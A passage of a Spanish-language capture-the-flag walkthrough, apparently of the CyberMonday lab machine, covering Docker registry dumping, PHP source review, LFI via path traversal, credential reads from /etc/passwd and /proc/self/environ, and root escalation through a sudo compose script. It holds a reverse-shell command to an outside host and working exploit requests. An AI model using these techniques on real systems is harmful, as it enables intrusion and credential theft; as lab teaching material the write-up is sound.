[|]    Docker Registry Grabber v1       @SyzikSecu       [|]
[+]======================================================[+]

[+] cybermonday_api
[+] BlobSum found 27
[+] Dumping cybermonday_api
    [+] Downloading : a3ed95caeb02ffe68cdd9fd84406680ae93d633cb16422d00e8a7c22955b46d4
    [+] Downloading : beefd953abbcb2b603a98ef203b682f8c5f62af19835c01206693ad61aed63ce
    [+] Downloading : ced3ae14b696846cab74bd01a27a10cb22070c74451e8c0c1f3dcb79057bcc5e
    [+] Downloading : a3ed95caeb02ffe68cdd9fd84406680ae93d633cb16422d00e8a7c22955b46d4
    [+] Downloading : ca62759c06e1877153b3eab0b3b734d6072dd2e6f826698bf55aedf50c0959c1
    [+] Downloading : 1696d1b2f2c3c8b37ae902dfd60316f8928a31ff8a5ed0a2f9bbf255354bdee8
    [+] Downloading : a3ed95caeb02ffe68cdd9fd84406680ae93d633cb16422d00e8a7c22955b46d4
    [+] Downloading : a3ed95caeb02ffe68cdd9fd84406680ae93d633cb16422d00e8a7c22955b46d4
    [+] Downloading : 57cdb531a15a172818ddf3eea38797a2f5c4547a302b65ab663bac6fc7ec4d4f
    [+] Downloading : 4756652e14e0fb6403c377eb87fd1ef557abc7864bf93bf7c25e19f91183ce2c
    [+] Downloading : 5c3b6a1cbf5455e10e134d1c129041d12a8364dac18a42cf6333f8fee4762f33
    [+] Downloading : 9f5fbfd5edfcaf76c951d4c46a27560120a1cd6a172bf291a7ee5c2b42afddeb
    [+] Downloading : 57fbc4474c06c29a50381676075d9ee5e8dca9fee0821045d0740a5bc572ec95
    [+] Downloading : a3ed95caeb02ffe68cdd9fd84406680ae93d633cb16422d00e8a7c22955b46d4
    [+] Downloading : a3ed95caeb02ffe68cdd9fd84406680ae93d633cb16422d00e8a7c22955b46d4
    [+] Downloading : a3ed95caeb02ffe68cdd9fd84406680ae93d633cb16422d00e8a7c22955b46d4
    [+] Downloading : a3ed95caeb02ffe68cdd9fd84406680ae93d633cb16422d00e8a7c22955b46d4
    [+] Downloading : a3ed95caeb02ffe68cdd9fd84406680ae93d633cb16422d00e8a7c22955b46d4
    [+] Downloading : a3ed95caeb02ffe68cdd9fd84406680ae93d633cb16422d00e8a7c22955b46d4
    [+] Downloading : a3ed95caeb02ffe68cdd9fd84406680ae93d633cb16422d00e8a7c22955b46d4
    [+] Downloading : dc968f4da64f18861801f2c677d2460c4cc530f2e64232f1a23021a9760ffdae
    [+] Downloading : a3ed95caeb02ffe68cdd9fd84406680ae93d633cb16422d00e8a7c22955b46d4
    [+] Downloading : 1684de57270ea8328d20b9d17cda5091ec9de632dbba9622cce10b82c2b20e62
    [+] Downloading : a3ed95caeb02ffe68cdd9fd84406680ae93d633cb16422d00e8a7c22955b46d4
    [+] Downloading : affe9439d2a25f35605a4fe59d9de9e65ba27de2403820981b091ce366b6ce70
    [+] Downloading : a3ed95caeb02ffe68cdd9fd84406680ae93d633cb16422d00e8a7c22955b46d4
    [+] Downloading : 5b5fe70539cd6989aa19f25826309f9715a9489cf1c057982d6a84c1ad8975c7
```

Los ordeno por tamaño de archivo

```null
du -hc *.gz
100M	1684de57270ea8328d20b9d17cda5091ec9de632dbba9622cce10b82c2b20e62.tar.gz
15M	1696d1b2f2c3c8b37ae902dfd60316f8928a31ff8a5ed0a2f9bbf255354bdee8.tar.gz
4.0K	4756652e14e0fb6403c377eb87fd1ef557abc7864bf93bf7c25e19f91183ce2c.tar.gz
4.0K	57cdb531a15a172818ddf3eea38797a2f5c4547a302b65ab663bac6fc7ec4d4f.tar.gz
12M	57fbc4474c06c29a50381676075d9ee5e8dca9fee0821045d0740a5bc572ec95.tar.gz
28M	5b5fe70539cd6989aa19f25826309f9715a9489cf1c057982d6a84c1ad8975c7.tar.gz
35M	5c3b6a1cbf5455e10e134d1c129041d12a8364dac18a42cf6333f8fee4762f33.tar.gz
4.0K	9f5fbfd5edfcaf76c951d4c46a27560120a1cd6a172bf291a7ee5c2b42afddeb.tar.gz
4.0K	a3ed95caeb02ffe68cdd9fd84406680ae93d633cb16422d00e8a7c22955b46d4.tar.gz
4.0K	affe9439d2a25f35605a4fe59d9de9e65ba27de2403820981b091ce366b6ce70.tar.gz
512K	beefd953abbcb2b603a98ef203b682f8c5f62af19835c01206693ad61aed63ce.tar.gz
116K	ca62759c06e1877153b3eab0b3b734d6072dd2e6f826698bf55aedf50c0959c1.tar.gz
512K	ced3ae14b696846cab74bd01a27a10cb22070c74451e8c0c1f3dcb79057bcc5e.tar.gz
4.0K	dc968f4da64f18861801f2c677d2460c4cc530f2e64232f1a23021a9760ffdae.tar.gz
190M	total
```

Uno de ellos, el ```beefd953abbcb2b603a98ef203b682f8c5f62af19835c01206693ad61aed63ce.tar.gz``` contiene el directorio ```/var/www/html```, que es el código fuente de la API (webhooks)

```null
ls
app  bootstrap.php  composer.json  composer.lock  config.php  keys  public  vendor
```

Examino el archivo ```app/helpers/Api.php```

```php
<?php

namespace app\helpers;
use app\helpers\Request;

abstract class Api
{
    protected $data;
    protected $user;
    private $api_key;

    public function __construct()
    {
        $method = Request::method();
        if(!isset($_SERVER['CONTENT_TYPE']) && $method != "get" || $method != "get" && $_SERVER['CONTENT_TYPE'] != "application/json")
        {
            return http_response_code(404);
        }

        header('Content-type: application/json; charset=utf-8');
        $this->data = json_decode(file_get_contents("php://input"));
    }

    public function auth()
    {
        if(!isset($_SERVER["HTTP_X_ACCESS_TOKEN"]) || empty($_SERVER["HTTP_X_ACCESS_TOKEN"]))
        {
            return $this->response(["status" => "error", "message" => "Unauthorized"], 403);
        }

        $token = $_SERVER["HTTP_X_ACCESS_TOKEN"];
        $decoded = decodeToken($token);
        if(!$decoded)
        {
            return $this->response(["status" => "error", "message" => "Unauthorized"], 403);
        }
    
        $this->user = $decoded;
    }

    public function apiKeyAuth()
    {
        $this->api_key = "22892e36-1770-11ee-be56-0242ac120002";

        if(!isset($_SERVER["HTTP_X_API_KEY"]) || empty($_SERVER["HTTP_X_API_KEY"]) || $_SERVER["HTTP_X_API_KEY"] != $this->api_key)
        {
            return $this->response(["status" => "error", "message" => "Unauthorized"], 403);
        }
    }

    public function admin()
    {
        $this->auth();
        
        if($this->user->role != "admin")
        {
            return $this->response(["status" => "error", "message" => "Unauthorized"], 403);
        }
    }

    public function response(array $data, $status = 200) {
        http_response_code($status);
        die(json_encode($data));
    }
}
```

Por alguna razón se está empleando la cabecera ```X_API_KEY```. Es posible leer los logs que se crean con un webhook, ya que está definido en el archivo ```app/controllers/LogsController.php```. Además, es vulnerable a LFI al tener el control sobre la variable ```$logPath```

```php
<?php

namespace app\controllers;
use app\helpers\Api;
use app\models\Webhook;

class LogsController extends Api
{
    public function index($request)
    {
        $this->apiKeyAuth();

        $webhook = new Webhook;
        $webhook_find = $webhook->find("uuid", $request->uuid);

        if(!$webhook_find)
        {
            return $this->response(["status" => "error", "message" => "Webhook not found"], 404);
        }

        if($webhook_find->action != "createLogFile")
        {
            return $this->response(["status" => "error", "message" => "This webhook was not created to manage logs"], 400);
        }

        $actions = ["list", "read"];

        if(!isset($this->data->action) || empty($this->data->action))
        {
            return $this->response(["status" => "error", "message" => "\"action\" not defined"], 400);
        }

        if($this->data->action == "read")
        {
            if(!isset($this->data->log_name) || empty($this->data->log_name))
            {
                return $this->response(["status" => "error", "message" => "\"log_name\" not defined"], 400);
            }
        }

        if(!in_array($this->data->action, $actions))
        {
            return $this->response(["status" => "error", "message" => "invalid action"], 400);
        }

        $logPath = "/logs/{$webhook_find->name}/";

        switch($this->data->action)
        {
            case "list":
                $logs = scandir($logPath);
                array_splice($logs, 0, 1); array_splice($logs, 0, 1);

                return $this->response(["status" => "success", "message" => $logs]);
            
            case "read":
                $logName = $this->data->log_name;

                if(preg_match("/\.\.\//", $logName))
                {
                    return $this->response(["status" => "error", "message" => "This log does not exist"]);
                }

                $logName = str_replace(' ', '', $logName);

                if(stripos($logName, "log") === false)
                {
                    return $this->response(["status" => "error", "message" => "This log does not exist"]);
                }

                if(!file_exists($logPath.$logName))
                {
                    return $this->response(["status" => "error", "message" => "This log does not exist"]);
                }

                $logContent = file_get_contents($logPath.$logName);
                


                return $this->response(["status" => "success", "message" => $logContent]);
        }
    }
}
```

Creo un log a través del webhook que viene por defecto

```null
POST /webhooks/fda96d32-e8c8-4301-8fb3-c821a316cf77 HTTP/1.1
Host: webhooks-api-beta.cybermonday.htb
User-Agent: curl/7.88.1
Accept: */*
x-access-token: eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJpZCI6MiwidXNlcm5hbWUiOiJydWJieCIsInJvbGUiOiJhZG1pbiJ9.bsb1EJW-SlTxHvyBRHcxT4Btw2OYoBiA2Ga3jpDmXSE
Connection: close
Content-Type: application/json
Content-Length: 41

{"log_name":"test", "log_content":"test"}
```

Proporcionando el ```X-Api-Key``` lo puedo listar

```null
POST /webhooks/fda96d32-e8c8-4301-8fb3-c821a316cf77/logs HTTP/1.1
Host: webhooks-api-beta.cybermonday.htb
User-Agent: curl/7.88.1
Accept: */*
x-access-token: eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJpZCI6MiwidXNlcm5hbWUiOiJydWJieCIsInJvbGUiOiJhZG1pbiJ9.bsb1EJW-SlTxHvyBRHcxT4Btw2OYoBiA2Ga3jpDmXSE
X-Api-Key: 22892e36-1770-11ee-be56-0242ac120002
Connection: close
Content-Type: application/json
Content-Length: 21

{"action":"list"}
```

```null
HTTP/1.1 200 OK
Server: nginx/1.25.1
Date: Wed, 23 Aug 2023 16:11:02 GMT
Content-Type: application/json; charset=utf-8
Connection: close
Host: webhooks-api-beta.cybermonday.htb
X-Powered-By: PHP/8.2.7
Set-Cookie: PHPSESSID=3c275b2993afe09d4ab97a5de09af78d; path=/
Expires: Thu, 19 Nov 1981 08:52:00 GMT
Cache-Control: no-store, no-cache, must-revalidate
Pragma: no-cache
Content-Length: 120

{"status":"success","message":["test-1692782721.log"]}
```

Y finalmente leer

```null
{"action":"read","log_name":"test-1692782721.log"}
```

```null
{"status":"success","message":"test\n"}
```


Me conecto a la base de datos

```null
proxychains mysql -h db -u'root' -p'root'
[proxychains] config file found: /etc/proxychains4.conf
[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4
Welcome to the MariaDB monitor.  Commands end with ; or \g.
Your MySQL connection id is 14
Server version: 8.0.33 MySQL Community Server - GPL

Copyright (c) 2000, 2018, Oracle, MariaDB Corporation Ab and others.

Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.

MySQL [(none)]> use webhooks_api;
Reading table information for completion of table and column names
You can turn off this feature to get a quicker startup with -A

Database changed
```

Listo las tablas

```null
MySQL [webhooks_api]> show tables;
+------------------------+
| Tables_in_webhooks_api |
+------------------------+
| users                  |
| webhooks               |
+------------------------+
2 rows in set (0.150 sec)
```

En ```webhooks``` hay una columna con el nombre, que corresponde a la variable vulnerable al LFI

```null
MySQL [webhooks_api]> select * from webhooks;
+----+--------------------------------------+-------+-------------------+---------------+
| id | uuid                                 | name  | description       | action        |
+----+--------------------------------------+-------+-------------------+---------------+
|  1 | fda96d32-e8c8-4301-8fb3-c821a316cf77 | tests | webhook for tests | createLogFile |
|  2 | 2a370bff-35c6-4722-8a4f-51926c7d1efb | test  | test              | sendRequest   |
+----+--------------------------------------+-------+-------------------+---------------+
```

Creo un nuevo ```webhook``` con identificador ```3``` y en el nombre añado en un path traversal

```null

MySQL [webhooks_api]> INSERT INTO webhooks VALUES (3,'fda96d32-e8c8-4301-8fb3-c821a316cf78', '../../../../../../../', 'd','createLogFile');
Query OK, 1 row affected (0.136 sec)
```

Obtengo el ```/etc/passwd```

```null
POST /webhooks/fda96d32-e8c8-4301-8fb3-c821a316cf78/logs HTTP/1.1
Host: webhooks-api-beta.cybermonday.htb
User-Agent: curl/7.88.1
Accept: */*
x-access-token: eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJpZCI6MiwidXNlcm5hbWUiOiJydWJieCIsInJvbGUiOiJhZG1pbiJ9.bsb1EJW-SlTxHvyBRHcxT4Btw2OYoBiA2Ga3jpDmXSE
X-Api-Key: 22892e36-1770-11ee-be56-0242ac120002
Connection: close
Content-Type: application/json
Content-Length: 56

{"action":"read","log_name":"logs/. ./etc/passwd"}
```

```null
{"status":"success","message":"root:x:0:0:root:\/root:\/bin\/bash\ndaemon:x:1:1:daemon:\/usr\/sbin:\/usr\/sbin\/nologin\nbin:x:2:2:bin:\/bin:\/usr\/sbin\/nologin\nsys:x:3:3:sys:\/dev:\/usr\/sbin\/nologin\nsync:x:4:65534:sync:\/bin:\/bin\/sync\ngames:x:5:60:games:\/usr\/games:\/usr\/sbin\/nologin\nman:x:6:12:man:\/var\/cache\/man:\/usr\/sbin\/nologin\nlp:x:7:7:lp:\/var\/spool\/lpd:\/usr\/sbin\/nologin\nmail:x:8:8:mail:\/var\/mail:\/usr\/sbin\/nologin\nnews:x:9:9:news:\/var\/spool\/news:\/usr\/sbin\/nologin\nuucp:x:10:10:uucp:\/var\/spool\/uucp:\/usr\/sbin\/nologin\nproxy:x:13:13:proxy:\/bin:\/usr\/sbin\/nologin\nwww-data:x:33:33:www-data:\/var\/www:\/usr\/sbin\/nologin\nbackup:x:34:34:backup:\/var\/backups:\/usr\/sbin\/nologin\nlist:x:38:38:Mailing List Manager:\/var\/list:\/usr\/sbin\/nologin\nirc:x:39:39:ircd:\/run\/ircd:\/usr\/sbin\/nologin\n_apt:x:42:65534::\/nonexistent:\/usr\/sbin\/nologin\nnobody:x:65534:65534:nobody:\/nonexistent:\/usr\/sbin\/nologin\n"}
```

En el ```/proc/self/environ``` se encuentra hardcodeada la contraseña de acceso a la base de datos, ```ngFfX2L71Nu```

```null
{"status":"success","message":"HOSTNAME=e1862f4e1242\u0000PHP_INI_DIR=\/usr\/local\/etc\/php\u0000HOME=\/root\u0000PHP_LDFLAGS=-Wl,-O1 -pie\u0000PHP_CFLAGS=-fstack-protector-strong -fpic -fpie -O2 -D_LARGEFILE_SOURCE -D_FILE_OFFSET_BITS=64\u0000DBPASS=ngFfX2L71Nu\u0000PHP_VERSION=8.2.7\u0000GPG_KEYS=39B641343D8C104B2B146DC3F9C39DC0B9698544 E60913E4DF209907D8E30D96659A97C9CF2A795A 1198C0117593497A5EC5C199286AF1F9897469DC\u0000PHP_CPPFLAGS=-fstack-protector-strong -fpic -fpie -O2 -D_LARGEFILE_SOURCE -D_FILE_OFFSET_BITS=64\u0000PHP_ASC_URL=https:\/\/www.php.net\/distributions\/php-8.2.7.tar.xz.asc\u0000PHP_URL=https:\/\/www.php.net\/distributions\/php-8.2.7.tar.xz\u0000DBHOST=db\u0000DBUSER=dbuser\u0000PATH=\/usr\/local\/sbin:\/usr\/local\/bin:\/usr\/sbin:\/usr\/bin:\/sbin:\/bin\u0000DBNAME=webhooks_api\u0000PHPIZE_DEPS=autoconf \t\tdpkg-dev \t\tfile \t\tg++ \t\tgcc \t\tlibc-dev \t\tmake \t\tpkg-config \t\tre2c\u0000PWD=\/var\/www\/html\u0000PHP_SHA256=4b9fb3dcd7184fe7582d7e44544ec7c5153852a2528de3b6754791258ffbdfa0\u0000"}
```

Si miro la montura del contenedor, se puede ver que en el directorio ```.ssh``` hay una clave pública para el usuario ```john```

```null
www-data@070370e2cdc4:/mnt/.ssh$ cat authorized_keys 
ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAACAQCy9ETY9f4YGlxIufnXgnIZGcV4pdk94RHW9DExKFNo7iEvAnjMFnyqzGOJQZ623wqvm2WS577WlLFYTGVe4gVkV2LJm8NISndp9DG9l1y62o1qpXkIkYCsP0p87zcQ5MPiXhhVmBR3XsOd9MqtZ6uqRiALj00qGDAc+hlfeSRFo3epHrcwVxAd41vCU8uQiAtJYpFe5l6xw1VGtaLmDeyektJ7QM0ayUHi0dlxcD8rLX+Btnq/xzuoRzXOpxfJEMm93g+tk3sagCkkfYgUEHp6YimLUqgDNNjIcgEpnoefR2XZ8EuLU+G/4aSNgd03+q0gqsnrzX3Syc5eWYyC4wZ93f++EePHoPkObppZS597JiWMgQYqxylmNgNqxu/1mPrdjterYjQ26PmjJlfex6/BaJWTKvJeHAemqi57VkcwCkBA9gRkHi9SLVhFlqJnesFBcgrgLDeG7lzLMseHHGjtb113KB0NXm49rEJKe6ML6exDucGHyHZKV9zgzN9uY4ntp2T86uTFWSq4U2VqLYgg6YjEFsthqDTYLtzHer/8smFqF6gbhsj7cudrWap/Dm88DDa3RW3NBvqwHS6E9mJNYlNtjiTXyV2TNo9TEKchSoIncOxocQv0wcrxoxSjJx7lag9F13xUr/h6nzypKr5C8GGU+pCu70MieA8E23lWtw== john@cybermonday
www-data@070370e2cdc4:/mnt/.ssh$ 
```

Me conecto como este usuario con la anterior contraseña. Puedo ver la primera flag

```null
ssh john@cybermonday.htb
john@cybermonday.htb's password: 
Linux cybermonday 5.10.0-24-amd64 #1 SMP Debian 5.10.179-5 (2023-08-08) x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
Last login: Wed Aug 23 07:22:02 2023 from 10.10.16.12
john@cybermonday:~$ cat user.txt
86bccf510fbf37d0c6732cb328820c62
```

# Escalada

Tengo un privilegio a nivel de sudoers

```null
john@cybermonday:~$ sudo -l
[sudo] password for john: 
Matching Defaults entries for john on localhost:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User john may run the following commands on localhost:
    (root) /opt/secure_compose.py *.yml
```

Puedo ejecutar este script en ```python3``` como el usuario ```root```, proporcionándole un ```yml```

```python
#!/usr/bin/python3
import sys, yaml, os, random, string, shutil, subprocess, signal

def get_user():
    return os.environ.get("SUDO_USER")

def is_path_inside_whitelist(path):
    whitelist = [f"/home/{get_user()}", "/mnt"]

    for allowed_path in whitelist:
        if os.path.abspath(path).startswith(os.path.abspath(allowed_path)):
            return True
    return False

def check_whitelist(volumes):
    for volume in volumes:
        parts = volume.split(":")
        if len(parts) == 3 and not is_path_inside_whitelist(parts[0]):
            return False
    return True

def check_read_only(volumes):
    for volume in volumes:
        if not volume.endswith(":ro"):
            return False
    return True

def check_no_symlinks(volumes):
    for volume in volumes:
        parts = volume.split(":")
        path = parts[0]
        if os.path.islink(path):
            return False
    return True

def check_no_privileged(services):
    for service, config in services.items():
        if "privileged" in config and config["privileged"] is True:
            return False
    return True

def main(filename):

    if not os.path.exists(filename):
        print(f"File not found")
        return False

    with open(filename, "r") as file:
        try:
            data = yaml.safe_load(file)
        except yaml.YAMLError as e:
            print(f"Error: {e}")
            return False

        if "services" not in data:
            print("Invalid docker-compose.yml")
            return False

        services = data["services"]

        if not check_no_privileged(services):
            print("Privileged mode is not allowed.")
            return False

        for service, config in services.items():
            if "volumes" in config:
                volumes = config["volumes"]
                if not check_whitelist(volumes) or not check_read_only(volumes):
                    print(f"Service '{service}' is malicious.")
                    return False
                if not check_no_symlinks(volumes):
                    print(f"Service '{service}' contains a symbolic link in the volume, which is not allowed.")
                    return False
    return True

def create_random_temp_dir():
    letters_digits = string.ascii_letters + string.digits
    random_str = ''.join(random.choice(letters_digits) for i in range(6))
    temp_dir = f"/tmp/tmp-{random_str}"
    return temp_dir

def copy_docker_compose_to_temp_dir(filename, temp_dir):
    os.makedirs(temp_dir, exist_ok=True)
    shutil.copy(filename, os.path.join(temp_dir, "docker-compose.yml"))

def cleanup(temp_dir):
    subprocess.run(["/usr/bin/docker-compose", "down", "--volumes"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    shutil.rmtree(temp_dir)

def signal_handler(sig, frame):
    print("\nSIGINT received. Cleaning up...")
    cleanup(temp_dir)
    sys.exit(1)

if __name__ == "__main__":
    if len(sys.argv) != 2:
        print(f"Use: {sys.argv[0]} <docker-compose.yml>")
        sys.exit(1)

    filename = sys.argv[1]
    if main(filename):
        temp_dir = create_random_temp_dir()
        copy_docker_compose_to_temp_dir(filename, temp_dir)
        os.chdir(temp_dir)
        
        signal.signal(signal.SIGINT, signal_handler)

        print("Starting services...")
        result = subprocess.run(["/usr/bin/docker-compose", "up", "--build"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        print("Finishing services")

        cleanup(temp_dir)
```

Creo mi propio ```yml``` que utilice la imagen de docker ya existente (cybermonday_api) para crear un nuevo contenedor y enviarme una reverse shell en este. Añado la partición de la máquina host para poder acceder a ella desde el contenedor

```yml
version: "3.0"
services:
  malicious-service:
    image: cybermonday_api
    devices:
      - /dev/sda1:/dev/sda1
    command: bash -c 'bash -i >& /dev/tcp/10.10.XX.XX/443 0>&1'
```

Una ver recibida la reverse shell, con  ```debugfs``` obtengo la segunda flag

```null
john@cybermonday:~$ sudo /opt/secure_compose.py docker-compose.yml 
Starting services...
```

```null
nc -nlvp 443
listening on [any] 443 ...
connect to [10.10.16.12] from (UNKNOWN) [10.129.216.7] 36486
bash: cannot set terminal process group (1): Inappropriate ioctl for device
bash: no job control in this shell
root@cfaca606b360:/var/www/html# debugfs /dev/sda1
debugfs /dev/sda1
debugfs 1.47.0 (5-Feb-2023)
debugfs:  cat /root/root.txt
cat /root/root.txt
703152ccad7e3cafbac42a1a109d5864
```